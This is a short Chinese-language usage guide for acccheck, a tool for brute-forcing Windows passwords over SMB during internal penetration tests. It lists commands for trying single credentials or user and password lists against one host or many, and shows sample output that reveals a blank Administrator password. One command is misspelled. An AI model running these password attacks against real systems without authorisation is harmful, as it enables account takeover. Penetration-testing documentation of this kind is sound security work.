项目简介：


该工具被设计为一个密码字典攻击的工具，目标是针对Windows身份验证通过SMB协议。


使用这个工具可以在渗透内网的环境下进行大范围的windows密码的暴力猜解，支持自定义用户名列表，密码列表，也支持对单独的用户名/密码进行尝试。


使用方法：

使用 [administrator] 和 [空密码] 对 [10.10.10.1] 进行尝试

acccheck -t 10.10.10.1

使用 [administrator] 和 [password.txt文件中的密码] 对 [10.10.10.1] 进行尝试

acccheck -t 10.10.10.1 -P password.txt

使用 [users.txt中的用户名] 和 [password.txt文件中的密码] 对 [10.10.10.1] 进行尝试

acccehck -t 10.10.10.1 -U users.txt -P password.txt

使用 [administrator] 和 [password] 对 [10.10.10.1] 进行尝试

acccheck -t 10.10.10.1 -u administrator -p password

使用 [administrator] 和 [password] 对 [ip.txt文件中的ip] 进行尝试

acccheck -T ip.txt -u administrator -p password


输出结果：

root@kali:~# acccheck.pl -T smb-ips.txt -v

Host:192.168.1.201, Username:Administrator, Password:BLANK
